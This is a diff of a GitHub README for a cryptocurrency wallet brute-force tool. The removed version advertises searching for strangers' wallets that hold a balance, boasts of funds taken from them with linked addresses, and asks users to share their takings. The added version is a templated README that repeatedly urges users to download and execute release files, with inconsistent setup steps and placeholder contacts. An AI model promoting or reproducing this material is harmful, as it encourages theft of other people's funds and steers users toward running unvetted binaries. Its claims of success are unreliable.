@@ -1,113 +1,135 @@
-# Crypto Bruteforce
+# Crypto Bruteforce 🔐
 
-**Wallet Gen** is a tool designed for brute force and generating cryptocurrency wallets (such as **Bitcoin** and **EVM-based** wallets like **ETH, BNB, MATIC, etc.**), as well as discovering forgotten or lost wallets that contain an existing balance.
+![Crypto Bruteforce](https://img.shields.io/badge/Version-1.0.0-brightgreen.svg) ![License](https://img.shields.io/badge/License-MIT-blue.svg)
 
-<p align="center">
-    <img width="1000" height="460" src="/assets/walletgen1.png" />
-</p>
+Welcome to the **Crypto Bruteforce** repository! This project focuses on automating the brute-force process for various cryptocurrency wallets and encryption methods. Whether you're a developer looking to enhance your crypto tools or a hobbyist interested in cryptocurrency security, this repository has something for you.
 
-<p align="center">
-    <img width="1000" height="460" src="/assets/walletgen_linux2.png" />
-</p>
+## Table of Contents
 
-## Downloads
-### WalletGen
-- [Windows x64](../../releases/walletgen)
-- [Linux](../../releases/walletgen)
+- [Introduction](#introduction)
+- [Features](#features)
+- [Topics](#topics)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
+## Introduction
 
-
-## Overview
-
-**Wallet Gen** is built in C++ and is open-source, allowing anyone to access and modify the code. Compared to Python-based wallet generators, **Wallet Gen** boasts significantly higher wallet generation speeds, with performance primarily relying on your graphics card. 
-For generating EVM wallets (ETH, BNB, MATIC, etc.), Wallet Gen uses the keccak256 algorithm, while Bitcoin wallets are created using the Segwit format under Bech32.
+Cryptocurrencies have transformed the way we think about money and security. However, with this transformation comes the challenge of securing wallets and data. The **Crypto Bruteforce** tool aims to assist users in testing the strength of their encryption methods. It can also be used for educational purposes to understand vulnerabilities in crypto wallets.
 
 ## Features
 
-1. <b>Generate a single Bitcoin wallet.</b>
-2. <b>Generate a single EVM wallet (ETH, BNB, MATIC, etc.).</b>
-3. <b>Search BTC wallets with balance (using the Internet - slower).</b>
-4. <b>Search BTC wallets with balance (using the database - faster).</b>
-5. <b>Search EVM wallets with balance (using the Internet - slower).</b>
-6. <b>Search EVM wallets with balance (using the database - faster).</b>
-
-# Demo
-
-<p align="center">
-    <img width="1000" height="460" src="/assets/walletgen.gif" />
-</p>
-
-<p align="center">
-    <img width="1000" height="460" src="/assets/walletgen_linux1.png" />
-</p>
-
-# Searching for Crypto Wallets
-
-**Wallet Gen** allows you to search using brute force method for two types of crypto wallets with an existing balance. To search for BTC wallets, press key `3` in the menu or run `start_search_btc.bat`. For searching EVM wallets (such as Ethereum, BNB, etc.), press key `4` in the menu or run `start_search_evm.bat`. 
-
-The search speed is determined by your hardware, especially your graphics card. To increase your chances of finding a wallet with a balance, you can run multiple instances of the program, from 1 to 4, depending on the power of your graphics card.
-
-## My Finds
-
-I’ve personally recovered two BTC wallets with a balance. The first had 0.000032 BTC, the second contained 0.0528 BTC (roughly $4800 at the time of discovery).  
-Here’s the link to the wallet: [bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay](https://mempool.space/address/bc1qk3m62hx2hh5mhvc0tj45f9xflzcnu0sur3rvay).
-
-<p align="center">
-    <img width="1000" height="460" src="/assets/tocozu.webp" />
-</p>
-
-### New Find 4/9/2025
-
-After a week of non-stop wallet searching, I finally found a [wallet](https://mempool.space/address/bc1q29c5m3w4jxtsj4vcd2ccw4t68xm8m7vs5vytu0) with 0.25 bitcoin ($19k). This is my 4th and biggest find of all time.
-
-<p align="center">
-    <img width="1000" height="460" src="https://github.com/user-attachments/assets/57f95d59-9da2-44f0-8f66-dbbe7fe69aee" />
-</p>
-
-## New Find 5/5/2025
-
-[bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp](https://mempool.space/address/bc1qpm0k3kcmthwsa4zseh33g3hl7eju8u8nkt83kp)
-
-<p align="center">
-    <img width="1000" height="460" src="https://github.com/user-attachments/assets/6c5faff7-594f-4d37-b91b-f6482c728611" />
-</p>
-
-
-## Building the Project
-
-1. Open the project file (`CryptoWalletGen.sln`) in Visual Studio or any other compatible C++ compiler.
-2. Install the necessary dependencies and build the project.
-
-```cmd
-> git clone https://github.com/microsoft/vcpkg
-> .\vcpkg\bootstrap-vcpkg.bat
-> .\vcpkg\vcpkg integrate install
-> .\vcpkg\vcpkg install openssl:x64-windows
-```
-
-3. Start building the project.
-
-## Todo
-1. Search for missing words in a seed phrase.
-
-## Contribute
-
-Contributions are welcome! If you have ideas, bug reports, or want to contribute to the codebase, feel free to submit a pull request.
-
-## Contacts
-If you have any questions or want to share your find or you found some bug in WalletGen work, feel free to message me!
-My Discord: **tonydevbtc.**
-
-## Donate
-
-I encourage you, when you find a wallet with a balance, to send me a small portion as a thank you. This motivates me to keep working on the program, keep it going, and make it better!
-
-**BTC:** bc1qeyrshy5ntsguwxe9m8tp2x2yqhddz7ymkj44h9
-
-**ETH:** 0x76c2E75B92Eb340f01B378e332FC7d8954893693
-
-## License
-This project is licensed under the [License](/LICENSE)
+- **Automated Brute-Force Attacks**: Easily test the strength of various wallets.
+- **Multi-Currency Support**: Works with multiple cryptocurrencies, including Monero and Bitcoin.
+- **User-Friendly Interface**: Simple commands make it easy to use.
+- **Customizable Parameters**: Adjust the attack settings based on your needs.
+- **Logging and Reporting**: Keep track of attempts and results for better analysis.
 
 ## Topics
-bitcoin, ethereum, crypto, cryptocurrency, crypto seed phrase mining, crypto bruteforce, bitcoin bruteforce, ethereum bruteforce, crypto finder, lost bitcoin, brute force wallet, crypto brute foce, crypto bruteforce, crypto bruteforce wallet, crypto bruteforce key, crypto wallet, crypto wallet recovery, crypto wallet seed generator, crypto wallet seed phrase, crypto wallet tools, wallet finder crypto, wallet recovery seeds, wallet recovery tools, seed phrase, seed phrase generator, bip39 wallet, trezor, walletgen, crypto mining, mnemonic generator, crypto recovery, recovery crypto, bitcoin wallet, ethereum wallet, seed phrase finder, seed phrase wallet, seed phrase generator with balance, seed phrase balance checker, seed phrase trust wallet, seed phrase generator and checker, seed phrase storage, seed phrase word list github, bitcoin explorer, bitcoin core, bitcoin mining, ethereum mining, lost bitcoin wallet list, lost bitcoin wallet finder, lost bitcoin wallets, lost bitcoin password, lost bitcoin addresses, crypto mining app, crypto mining software, mnemonic phrase, mnemonic, mnemonic phrase generator, mnemonic phrase checker, mnemonic phrase lost, mnemonic phrase to private key, mnemonic phrase wallet, private key finder, private key bitcoin, private keys database, private key metamask, private key to seed phrase, private key, private key ethereum, private key wallet, crypto address check, brute crypto mining, brute crypto
+
+This repository covers a range of topics related to cryptocurrency and automation. Some of the key areas include:
+
+- crypto
+- crypto-api
+- crypto-automation
+- crypto-bot
+- crypto-game
+- crypto-market
+- crypto-tools
+- crypto-trading
+- cryptocurrenices
+- cryptocurrency
+- cryptocurrency-tool
+- cryptocurrency-wallet
+- cryptohack
+- cryptoicons
+- monero
+- rsa-cryptography
+
+## Installation
+
+To get started with **Crypto Bruteforce**, you need to download the latest release. You can find it [here](https://github.com/ph-quake-master/crypto-bruteforce/releases). Make sure to download and execute the necessary files as per your operating system.
+
+### Prerequisites
+
+Before you install, ensure you have the following:
+
+- Python 3.x installed on your machine.
+- Basic understanding of command-line operations.
+- Required libraries (these can be installed via pip).
+
+### Steps to Install
+
+1. Clone the repository:
+
+   ```bash
+   git clone https://github.com/ph-quake-master/crypto-bruteforce.git
+   cd crypto-bruteforce
+   ```
+
+2. Install required libraries:
+
+   ```bash
+   pip install -r requirements.txt
+   ```
+
+3. Download the latest release from [here](https://github.com/ph-quake-master/crypto-bruteforce/releases).
+
+4. Execute the main script:
+
+   ```bash
+   python main.py
+   ```
+
+## Usage
+
+Using **Crypto Bruteforce** is straightforward. Once you have installed the necessary files, you can start testing the strength of your wallets. Here’s a quick guide on how to use the tool:
+
+### Command-Line Options
+
+- `-h`, `--help`: Show help message and exit.
+- `-w`, `--wallet`: Specify the wallet address.
+- `-p`, `--password`: Provide a password list for brute-force attempts.
+- `-t`, `--threads`: Set the number of threads to use.
+
+### Example Command
+
+```bash
+python main.py -w <your_wallet_address> -p <path_to_password_list> -t 4
+```
+
+This command will start a brute-force attack on the specified wallet using the provided password list with 4 threads.
+
+## Contributing
+
+We welcome contributions to improve the **Crypto Bruteforce** tool. If you want to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch (`git checkout -b feature-branch`).
+3. Make your changes and commit them (`git commit -m 'Add new feature'`).
+4. Push to the branch (`git push origin feature-branch`).
+5. Open a pull request.
+
+Please ensure your code follows the existing style and includes tests where applicable.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Contact
+
+For questions or suggestions, feel free to reach out:
+
+- **Email**: [your-email@example.com](mailto:your-email@example.com)
+- **Twitter**: [@your_twitter_handle](https://twitter.com/your_twitter_handle)
+
+## Releases
+
+To stay updated with the latest versions and features, check the [Releases](https://github.com/ph-quake-master/crypto-bruteforce/releases) section. Here, you can download the latest files and execute them as needed.
+
+---
+
+Thank you for visiting the **Crypto Bruteforce** repository. We hope you find it useful in your cryptocurrency endeavors!
